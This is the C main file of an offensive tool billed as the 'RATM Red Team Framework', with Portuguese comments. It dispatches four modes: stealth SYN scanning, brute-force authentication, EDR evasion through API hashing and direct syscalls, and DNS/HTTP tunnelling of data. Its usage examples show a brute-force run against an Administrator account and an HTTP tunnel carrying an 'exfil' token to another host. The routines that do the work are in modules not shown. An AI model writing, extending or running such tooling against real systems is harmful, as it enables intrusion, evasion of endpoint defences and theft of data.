#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

// Cabeçalho mestre que centraliza todos os módulos e macros
#include "ratm.h"

void print_banner(void) {
    printf(COLOR_RED);
    printf(
        "██████╗  █████╗ ████████╗███╗   ███╗\n"
        "██╔══██╗██╔══██╗╚══██╔══╝████╗ ████║\n"
        "██████╔╝███████║   ██║   ██╔████╔██║\n"
        "██╔══██╗██╔══██║   ██║   ██║╚██╔╝██║\n"
        "██║  ██║██║  ██║   ██║   ██║ ╚═╝ ██║\n"
        "╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝\n"
    );

    printf(COLOR_RESET);

    printf(COLOR_RED);
    printf(
        "  ▄████████████████████████████████████████████████▄\n"
        "  █                                                  █\n"
        "  █   [ RATM ]  RED TEAM FRAMEWORK                   █\n"
        "  █   [ SYS  ]  %-36s █\n"
        "  █   [ VER  ]  %-36s █\n"
        "  █                                                  █\n"
        "  █   > HIGH-PERFORMANCE C PURE ENGINE               █\n"
        "  █                                                  █\n"
        "  ▀████████████████████████████████████████████████▀\n",
        RATM_NAME,
        RATM_VERSION
    );

    printf(
        "\n"
        "  [!] INITIALIZING TACTICAL ENVIRONMENT...\n"
        "  [#] SYSTEM READY // NO COMPROMISE\n\n"
    );

    printf(COLOR_RESET);
}

void print_usage(const char *prog_name) {
    printf("Uso: %s [MODO] [OPÇÕES]\n\n", prog_name);
    printf("Modos Disponíveis:\n");
    printf("  recon     - Executa o Ghost Discovery (Varredura Assíncrona)\n");
    printf("  auth      - Executa o Adaptive Auth Engine (Força Bruta Estocástica)\n");
    printf("  evasion   - Executa a Auditoria de EDR e Direct Syscalls\n");
    printf("  tunnel    - Testa o Protocol Camouflage & Tunneling (DNS/HTTP)\n\n");
    printf("Exemplos:\n");
    printf("  sudo %s recon 192.168.1.50 445\n", prog_name);
    printf("  %s auth 192.168.1.100 445 Administrator Password123\n", prog_name);
    printf("  %s evasion\n", prog_name);
    printf("  %s tunnel http 192.168.1.200 80 token_exfil_xyz\n", prog_name);
}

int main(int argc, char *argv[]) {
    // Inicializa a semente randômica para as funções de evasão e jitter
    srand(time(NULL));

    if (argc < 2) {
        print_banner();
        print_usage(argv[0]);
        return 1;
    }

    // Modo 1: Ghost Discovery (Recon)
    if (strcmp(argv[1], "recon") == 0) {
        if (argc < 4) {
            LOG_ERROR("Uso correto: %s recon <IP_ALVO> <PORTA>", argv[0]);
            return 1;
        }

        print_banner();
        char local_ip[64];
        if (get_local_ip(local_ip, sizeof(local_ip)) == 0) {
            LOG_SUCCESS("IP Local detectado automaticamente: %s", local_ip);
        } else {
            strcpy(local_ip, "192.168.1.10"); // Fallback padrão
            LOG_WARN("Usando IP padrão de fallback: %s", local_ip);
        }

        const char *target_ip = argv[2];
        int target_port = atoi(argv[3]);

        LOG_INFO("Iniciando Ghost Discovery contra %s na porta %d...", target_ip, target_port);
        
        // Envia o pacote de varredura
        send_ghost_syn(local_ip, target_ip, target_port);
        
        // Ativa o listener para escutar a resposta
        start_ghost_listener(target_port);
    }
    // Modo 2: Adaptive Auth Engine (Auth)
    else if (strcmp(argv[1], "auth") == 0) {
        if (argc < 6) {
            LOG_ERROR("Uso correto: %s auth <IP> <PORTA> <USUARIO> <SENHA>", argv[0]);
            return 1;
        }

        print_banner();
        const char *target_ip = argv[2];
        int port = atoi(argv[3]);
        const char *username = argv[4];
        const char *password = argv[5];

        LOG_INFO("Acionando Adaptive Auth Engine contra %s:%d...", target_ip, port);
        adaptive_brute_launch(target_ip, port, username, password, 1);
    }
    // Modo 3: Hook & Defense Auditor (Evasion)
    else if (strcmp(argv[1], "evasion") == 0) {
        print_banner();
        LOG_INFO("Executando auditoria de ambiente e EDR hooks...");
        
        // Testando hash de API
        uint32_t hash_sample = calculate_hash("NtAllocateVirtualMemory");
        LOG_SUCCESS("Hash gerado para API crítica (Oculto estaticamente): 0x%X", hash_sample);

        // Executando exemplo de auditoria e syscall
        audit_user_hooks((void *)main);
        execute_direct_syscall();
    }
    // Modo 4: Protocol Camouflage & Tunneling (Tunnel)
    else if (strcmp(argv[1], "tunnel") == 0) {
        if (argc < 5) {
            LOG_ERROR("Uso correto: %s tunnel <http|dns> <IP_ALVO> <DADOS/PAYLOAD>", argv[0]);
            return 1;
        }

        print_banner();
        if (strcmp(argv[2], "dns") == 0) {
            char dns_buffer[256];
            encode_dns_tunnel(argv[4], dns_buffer, sizeof(dns_buffer));
        } else if (strcmp(argv[2], "http") == 0) {
            if (argc < 6) {
                LOG_ERROR("Uso correto para HTTP: %s tunnel http <IP_ALVO> <PORTA> <PAYLOAD>", argv[0]);
                return 1;
            }
            int port = atoi(argv[4]);
            send_camouflaged_http_heartbeat(argv[3], port, argv[5]);
        } else {
            LOG_ERROR("Tipo de túnel desconhecido. Use 'dns' ou 'http'.");
        }
    } else {
        print_banner();
        print_usage(argv[0]);
        return 1;
    }

    return 0;
}
